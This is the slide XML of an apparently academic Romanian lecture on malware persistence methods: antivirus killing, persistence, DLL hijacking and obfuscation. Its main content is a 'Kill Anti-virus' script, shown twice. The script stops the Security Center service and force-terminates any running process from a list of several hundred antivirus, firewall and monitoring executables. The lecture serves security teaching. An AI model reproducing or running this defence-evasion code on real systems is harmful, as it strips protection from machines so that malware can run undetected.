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53"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="365" r:id="rId4"/>
    <p:sldId id="366" r:id="rId5"/>
    <p:sldId id="521" r:id="rId6"/>
    <p:sldId id="469" r:id="rId7"/>
    <p:sldId id="494" r:id="rId8"/>
    <p:sldId id="447" r:id="rId9"/>
    <p:sldId id="376" r:id="rId10"/>
    <p:sldId id="448" r:id="rId11"/>
    <p:sldId id="399" r:id="rId12"/>
    <p:sldId id="396" r:id="rId13"/>
    <p:sldId id="397" r:id="rId14"/>
    <p:sldId id="401" r:id="rId15"/>
    <p:sldId id="402" r:id="rId16"/>
    <p:sldId id="617" r:id="rId17"/>
    <p:sldId id="403" r:id="rId18"/>
    <p:sldId id="405" r:id="rId19"/>
    <p:sldId id="406" r:id="rId20"/>
    <p:sldId id="407" r:id="rId21"/>
    <p:sldId id="408" r:id="rId22"/>
    <p:sldId id="409" r:id="rId23"/>
    <p:sldId id="410" r:id="rId24"/>
    <p:sldId id="411" r:id="rId25"/>
    <p:sldId id="414" r:id="rId26"/>
    <p:sldId id="415" r:id="rId27"/>
    <p:sldId id="412" r:id="rId28"/>
    <p:sldId id="413" r:id="rId29"/>
    <p:sldId id="479" r:id="rId30"/>
    <p:sldId id="473" r:id="rId31"/>
    <p:sldId id="474" r:id="rId32"/>
    <p:sldId id="475" r:id="rId33"/>
    <p:sldId id="476" r:id="rId34"/>
    <p:sldId id="477" r:id="rId35"/>
    <p:sldId id="478" r:id="rId36"/>
    <p:sldId id="457" r:id="rId37"/>
    <p:sldId id="485" r:id="rId38"/>
    <p:sldId id="486" r:id="rId39"/>
    <p:sldId id="487" r:id="rId40"/>
    <p:sldId id="488" r:id="rId41"/>
    <p:sldId id="489" r:id="rId42"/>
    <p:sldId id="459" r:id="rId43"/>
    <p:sldId id="490" r:id="rId44"/>
    <p:sldId id="491" r:id="rId45"/>
    <p:sldId id="492" r:id="rId46"/>
    <p:sldId id="493" r:id="rId47"/>
    <p:sldId id="502" r:id="rId48"/>
    <p:sldId id="504" r:id="rId49"/>
    <p:sldId id="619" r:id="rId50"/>
    <p:sldId id="618" r:id="rId51"/>
    <p:sldId id="61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66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52" autoAdjust="0"/>
    <p:restoredTop sz="94556" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="150" d="100"/>
          <a:sy n="150" d="100"/>
        </p:scale>
        <p:origin x="19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6F407-2509-4896-B052-D1E133D2D6C1}"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AC7B3-F878-493F-9CCE-D2C2EBD91389}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="331537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1</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1794013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216773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496557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91588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858644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4AC5B1-2738-48D4-A0C6-3A310133A60C}"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20837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4AC5B1-2738-48D4-A0C6-3A310133A60C}"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125306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4AC5B1-2738-48D4-A0C6-3A310133A60C}"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800180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335580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40285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39545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085763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282038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88107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950905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270017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1429855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732269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66580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387669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139339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717931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709459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831203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16632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1872946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3238079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4089180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603860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595565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7352608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667509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116411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1636445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3057462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8267481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4872388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2356212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1738944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913916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3.jp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AC5B1-2738-48D4-A0C6-3A310133A60C}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>5/24/2026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FA3F78-FC3A-4AB5-AD97-234B982F5D45}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="45864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492107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09666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learn.microsoft.com/en-us/windows/win32/services/writing-a-service-program-s-main-function" TargetMode="Externa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attack.mitre.org/techniques/T1574/001/" TargetMode="Externa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462210" y="875627"/>
            <a:ext cx="10218364" cy="2766528"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" u="sng"/>
              <a:t>C.13</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it-IT"/>
              <a:t>Metode de persistenta</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Subtitle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Paul A. Gagniuc</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="21419859">
            <a:off x="7300616" y="4413841"/>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1018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Principalele părți ale prezentării</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="13"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1126641" y="2651209"/>
            <a:ext cx="9956042" cy="2792519"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>C.13.1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Anihilarea</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>programelor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> antimalware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>C.13.2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Persistenta</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>C.13.3 DLL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>HijackinG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="50000"/>
                  <a:lumOff val="50000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>C.13.4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Ofruscarea</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="50000"/>
                  <a:lumOff val="50000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2039546"/>
            <a:ext cx="4216219" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="it-IT" sz="2800">
                <a:solidFill>
                  <a:prstClr val="black">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:prstClr>
                </a:solidFill>
              </a:rPr>
              <a:t>C.13 Metode de persistenta:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:lumMod val="50000"/>
                  <a:lumOff val="50000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRP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1357110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fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" u="sng"/>
              <a:t>C.13.1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> Anihilarea programelor antimalware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943948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992" y="179249"/>
            <a:ext cx="5922264" cy="859536"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Agency FB" panose="020B0503020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Kill Anti-virus</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="316992" y="1056404"/>
            <a:ext cx="6504432" cy="3790333"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
            </a:pP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Kill Anti-virus To Run Your Malware [ BlackHat ]</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 stop \"Security Center\""</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'AAWTray.exe'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'Ad-Aware.exe'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'MSASCui.exe'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'cmd.exe'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'cmd32.exe'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'_avp32.exe'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'_avpcc.exe'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'_avpm.exe'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'aAvgApi.exe'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'ackwin32.exe'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'adaware.exe'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'advxdwin.exe'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'agentsvr.exe'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'wupdater.exe'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'wupdt.exe'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'wyvernworksfirewall.exe'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'xpf202en.exe'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'zapro.exe'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'zapsetup3001.exe'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'zatutor.exe'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'zonalm2601.exe'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'zonealarm.exe'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processes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'TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="'</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read</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processes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split</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".exe"</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append</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replace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"K\n"</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replace</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Killing Antivirus services on this pc"</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killing off "</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endParaRPr lang="en-US" sz="900">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="9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"TASKKILL /F /IM \"{}\""</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format</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9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9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900">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6821424" y="179249"/>
            <a:ext cx="5148072" cy="6678751"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
            </a:pP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 stop \"Security Center\""</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'AAWTray.exe'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'Ad-Aware.exe'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'MSASCui.exe'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'_avpcc.exe'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'_avpm.exe'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'aAvgApi.exe'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'ackwin32.exe'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'adaware.exe'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'advxdwin.exe'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'agentsvr.exe'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'agentw.exe'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'alertsvc.exe'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'alevir.exe'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'alogserv.exe'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'amon9x.exe'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'anti-trojan.exe'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'antivirus.exe'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'ants.exe'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'apimonitor.exe'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'aplica32.exe'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'apvxdwin.exe'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'arr.exe'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'atcon.exe'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'atguard.exe'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'atro55en.exe'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'atupdater.exe'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'atwatch.exe'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'auto-protect.nav80try.exe'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'autodown.exe'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'autotrace.exe'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'autoupdate.exe'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'avconsol.exe'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'ave32.exe'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'avgcc32.exe'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'avgctrl.exe'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'avgemc.exe'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'avgrsx.exe'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'avgserv9.exe'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'avguard.exe'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'avgw.exe'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'avkpop.exe'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'avkserv.exe'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'avkservice.exe'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'avkwctl9.exe'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'avltmain.exe'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'avpcc.exe'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'avpdos32.exe'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'avptc32.exe'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'avpupd.exe'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'avsched32.exe'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'avsynmgr.exe'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'avwin95.exe'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'avwinnt.exe'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'avwupd.exe'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'avwupd32.exe'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'avwupsrv.exe'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'avxmonitor9x.exe'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'avxmonitornt.exe'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'avxquar.exe'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'backweb.exe'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'bargains.exe'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'bd_professional.exe'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'beagle.exe'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'belt.exe'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'bidef.exe'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'bidserver.exe'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'bipcp.exe'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'bipcpevalsetup.exe'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'bisp.exe'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'blackd.exe'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'blackice.exe'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'blink.exe'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'blss.exe'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'bootconf.exe'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'bootwarn.exe'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'borg2.exe'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'bpc.exe'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'brasil.exe'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'bs120.exe'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'bundle.exe'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'bvt.exe'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'ccapp.exe'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'ccevtmgr.exe'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'ccpxysvc.exe'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'cdp.exe'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'cfgwiz.exe'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'cfiadmin.exe'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'cfiaudit.exe'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'cfinet.exe'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'cfinet32.exe'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'claw95.exe'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'claw95cf.exe'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'clean.exe'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'cleaner.exe'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'cleaner3.exe'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'cleanpc.exe'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'click.exe'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'cmesys.exe'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'cmgrdian.exe'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'cmon016.exe'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'connectionmonitor.exe'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'cpd.exe'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'cpf9x206.exe'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'cpfnt206.exe'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'ctrl.exe'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'cwnb181.exe'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'cwntdwmo.exe'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'datemanager.exe'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'dcomx.exe'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'defalert.exe'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'defscangui.exe'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'defwatch.exe'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'deputy.exe'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'divx.exe'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'dllcache.exe'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'dllreg.exe'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'doors.exe'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'dpf.exe'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'dpfsetup.exe'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'dpps2.exe'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'drwatson.exe'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'drweb32.exe'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'drwebupw.exe'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'dssagent.exe'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'dvp95.exe'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'dvp95_0.exe'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'ecengine.exe'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'efpeadm.exe'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'emsw.exe'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'esafe.exe'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'escanhnt.exe'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'escanv95.exe'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'espwatch.exe'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'ethereal.exe'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'etrustcipe.exe'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'evpn.exe'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'exantivirus-cnet.exe'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'exe.avxw.exe'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'expert.exe'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'explore.exe'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'f-agnt95.exe'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'f-prot.exe'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'f-prot95.exe'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'f-stopw.exe'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'fameh32.exe'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'fast.exe'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'fch32.exe'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'fih32.exe'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'findviru.exe'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'firewall.exe'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'fnrb32.exe'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'fp-win.exe'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'fp-win_trial.exe'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'fprot.exe'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'frw.exe'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'fsaa.exe'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'fsav32.exe'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'fsav530stbyb.exe'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'fsav530wtbyb.exe'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'fsav95.exe'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'fsgk32.exe'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'fsm32.exe'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'fsma32.exe'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'fsmb32.exe'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'gator.exe'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'gbmenu.exe'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'gbpoll.exe'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'generics.exe'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'gmt.exe'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'guard.exe'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'guarddog.exe'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'hacktracersetup.exe'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'hbinst.exe'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'hbsrv.exe'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'hotactio.exe'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'hotpatch.exe'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'htlog.exe'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'htpatch.exe'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'hwpe.exe'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'hxdl.exe'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'hxiul.exe'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'iamapp.exe'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'iamserv.exe'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'iamstats.exe'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'ibmasn.exe'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'ibmavsp.exe'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'icload95.exe'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'icloadnt.exe'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'icmon.exe'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'icsupp95.exe'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'icsuppnt.exe'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'idle.exe'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'iedll.exe'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'iedriver.exe'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'iexplorer.exe'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'iface.exe'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'ifw2000.exe'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'inetlnfo.exe'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'infus.exe'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'infwin.exe'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'intdel.exe'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'intren.exe'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'iomon98.exe'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'istsvc.exe'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'jammer.exe'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'jdbgmrg.exe'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'jedi.exe'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'kavlite40eng.exe'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'kavpers40eng.exe'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'kavpf.exe'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'kazza.exe'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'keenvalue.exe'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'kerio-pf-213-en-win.exe'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'kerio-wrl-421-en-win.exe'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'kerio-wrp-421-en-win.exe'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'kernel32.exe'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'killprocesssetup161.exe'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'launcher.exe'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'ldnetmon.exe'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'ldpro.exe'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'ldpromenu.exe'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'ldscan.exe'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'lnetinfo.exe'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'loader.exe'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'localnet.exe'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'lockdown.exe'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'lockdown2000.exe'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'lookout.exe'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'lordpe.exe'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'luall.exe'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'luau.exe'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'lucomserver.exe'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'luinit.exe'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'luspt.exe'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'mapisvc32.exe'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'mcagent.exe'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'mcmnhdlr.exe'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'mcshield.exe'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'mctool.exe'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'mcvsrte.exe'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'mcvsshld.exe'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'mfin32.exe'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'mfw2en.exe'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'mfweng3.02d30.exe'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'mgavrtcl.exe'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'mgavrte.exe'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'mghtml.exe'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'mgui.exe'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'minilog.exe'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'mmod.exe'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'moolive.exe'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'mostat.exe'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'mpfagent.exe'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'mpfservice.exe'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'mpftray.exe'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'mrflux.exe'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'msapp.exe'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'msbb.exe'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'msblast.exe'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'mscache.exe'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'msccn32.exe'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'mscman.exe'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'msconfig.exe'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'msdm.exe'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'msdos.exe'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'msiexec16.exe'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'msinfo32.exe'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'mslaugh.exe'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'msmgt.exe'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'msmsgri32.exe'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'mssmmc32.exe'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'mssys.exe'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'msvxd.exe'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'mu0311ad.exe'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'mwatch.exe'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'n32scanw.exe'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'navap.navapsvc.exe'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'navapsvc.exe'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'navapw32.exe'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'navdx.exe'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'navlu32.exe'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'navstub.exe'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'navw32.exe'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'navwnt.exe'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'nc2000.exe'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'ncinst4.exe'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'ndd32.exe'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'neomonitor.exe'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'neowatchlog.exe'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'netarmor.exe'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'netinfo.exe'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'netscanpro.exe'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'netspyhunter-1.2.exe'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'netstat.exe'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'netutils.exe'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'nisserv.exe'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'nisum.exe'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'nmain.exe'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'nod32.exe'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'normist.exe'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'norton_internet_secu_3.0_407.exe'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'notstart.exe'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'npf40_tw_98_nt_me_2k.exe'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'npfmessenger.exe'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'nprotect.exe'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'npscheck.exe'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'npssvc.exe'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'nsched32.exe'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'nssys32.exe'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'nstask32.exe'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'nsupdate.exe'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'ntrtscan.exe'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'ntvdm.exe'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'ntxconfig.exe'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'nui.exe'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'nupgrade.exe'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'nvarch16.exe'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'nvc95.exe'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'nvsvc32.exe'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'nwinst4.exe'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'nwservice.exe'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'nwtool16.exe'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'ollydbg.exe'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'onsrvr.exe'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'optimize.exe'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'ostronet.exe'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'otfix.exe'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'outpost.exe'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'outpostinstall.exe'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'outpostproinstall.exe'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'padmin.exe'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'panixk.exe'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'patch.exe'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'pavcl.exe'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'pavproxy.exe'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'pavsched.exe'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'pavw.exe'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'pccwin98.exe'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'pcfwallicon.exe'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'pcip10117_0.exe'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'pcscan.exe'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'pdsetup.exe'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'periscope.exe'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'persfw.exe'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'perswf.exe'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'pf2.exe'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'pfwadmin.exe'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'pgmonitr.exe'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'pingscan.exe'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'platin.exe'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'pop3trap.exe'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'poproxy.exe'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'popscan.exe'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'portdetective.exe'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'portmonitor.exe'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'powerscan.exe'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'ppinupdt.exe'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'pptbc.exe'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'ppvstop.exe'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'prizesurfer.exe'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'prmt.exe'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'prmvr.exe'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'procdump.exe'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'processmonitor.exe'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'procexplorerv1.0.exe'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'programauditor.exe'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'proport.exe'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'protectx.exe'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'pspf.exe'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'purge.exe'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'qconsole.exe'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'qserver.exe'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'rapapp.exe'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'rav7.exe'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'rav7win.exe'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'rav8win32eng.exe'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'rb32.exe'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'rcsync.exe'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'realmon.exe'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'reged.exe'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'regedit.exe'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'regedt32.exe'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'rescue.exe'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'rescue32.exe'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'rrguard.exe'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'rshell.exe'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'rtvscan.exe'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'rtvscn95.exe'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'rulaunch.exe'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'run32dll.exe'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'rundll.exe'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'rundll16.exe'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'ruxdll32.exe'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'safeweb.exe'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'sahagent.exe'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'save.exe'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'savenow.exe'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'sbserv.exe'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'scam32.exe'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'scan32.exe'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'scan95.exe'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'scanpm.exe'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'scrscan.exe'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'serv95.exe'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'setup_flowprotector_us.exe'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'setupvameeval.exe'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'sfc.exe'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'sgssfw32.exe'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'sh.exe'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'shellspyinstall.exe'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'shn.exe'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'showbehind.exe'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'smc.exe'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'sms.exe'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'smss32.exe'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'soap.exe'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'sofi.exe'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'sperm.exe'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'spf.exe'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'sphinx.exe'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'spoler.exe'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'spoolcv.exe'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'spoolsv32.exe'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'spyxx.exe'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'srexe.exe'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'srng.exe'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'ss3edit.exe'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'ssg_4104.exe'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'ssgrate.exe'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'st2.exe'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'start.exe'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'stcloader.exe'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'supftrl.exe'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'support.exe'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'supporter5.exe'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'svchostc.exe'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'svchosts.exe'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'svshost.exe'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'sweep95.exe'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'sweepnet.sweepsrv.sys.swnetsup.exe'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'symproxysvc.exe'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'symtray.exe'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'sysedit.exe'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'system.exe'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'system32.exe'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'sysupd.exe'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'taskmg.exe'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'taskmgr.exe'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'taskmo.exe'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'taumon.exe'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'tbscan.exe'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'tc.exe'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'tca.exe'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'tcm.exe'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'tds-3.exe'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'tds2-98.exe'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'tds2-nt.exe'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'teekids.exe'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'tfak.exe'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'tfak5.exe'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'tgbob.exe'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'titanin.exe'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'titaninxp.exe'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'tracert.exe'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'trickler.exe'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'trjscan.exe'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'trjsetup.exe'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'trojantrap3.exe'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'tsadbot.exe'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'tvmd.exe'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'tvtmd.exe'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'undoboot.exe'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'updat.exe'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'upgrad.exe'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'utpost.exe'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'vbcmserv.exe'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'vbcons.exe'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'vbust.exe'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'vbwin9x.exe'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'vbwinntw.exe'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'vcsetup.exe'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'vet32.exe'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'vet95.exe'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'vettray.exe'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'vfsetup.exe'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'vir-help.exe'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'virusmdpersonalfirewall.exe'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'vnlan300.exe'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'vnpc3000.exe'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'vpc32.exe'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'vpc42.exe'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'vpfw30s.exe'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'vptray.exe'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'vscan40.exe'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'vscenu6.02d30.exe'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'vsched.exe'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'vsecomr.exe'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'vshwin32.exe'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'vsisetup.exe'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'vsmain.exe'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'vsmon.exe'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'vsstat.exe'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'vswin9xe.exe'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'vswinntse.exe'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'vswinperse.exe'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'w32dsm89.exe'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'w9x.exe'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'watchdog.exe'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'webdav.exe'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'webscanx.exe'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'webtrap.exe'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'wfindv32.exe'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'whoswatchingme.exe'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'wimmun32.exe'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'win-bugsfix.exe'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'win32us.exe'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'winactive.exe'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'window.exe'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'windows.exe'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'wininetd.exe'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'wininitx.exe'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'winlogin.exe'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'winmain.exe'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'winnet.exe'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'winppr32.exe'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'winrecon.exe'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'winservn.exe'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'winssk32.exe'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'winstart.exe'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'winstart001.exe'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'wintsk32.exe'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'winupdate.exe'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'wkufind.exe'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'wnad.exe'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'wnt.exe'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'wradmin.exe'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'wrctrl.exe'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'wsbgate.exe'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'wupdater.exe'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'wupdt.exe'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'wyvernworksfirewall.exe'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'xpf202en.exe'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'zapro.exe'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'zapsetup3001.exe'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'zatutor.exe'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'zonalm2601.exe'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'zonealarm.exe'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processes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'TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="'</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read</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processes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split</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".exe"</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append</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replace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"K\n"</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replace</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Killing Antivirus services on this pc"</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killing off "</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av</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="500">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="5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popen</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"TASKKILL /F /IM \"{}\""</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format</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5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t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="5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500">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="500">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Title 1"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="316992" y="5060650"/>
            <a:ext cx="5922264" cy="85953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chemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="Agency FB" panose="020B0503020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Din cand in cand si functioneaza…</a:t>
            </a:r>
          </a:p>
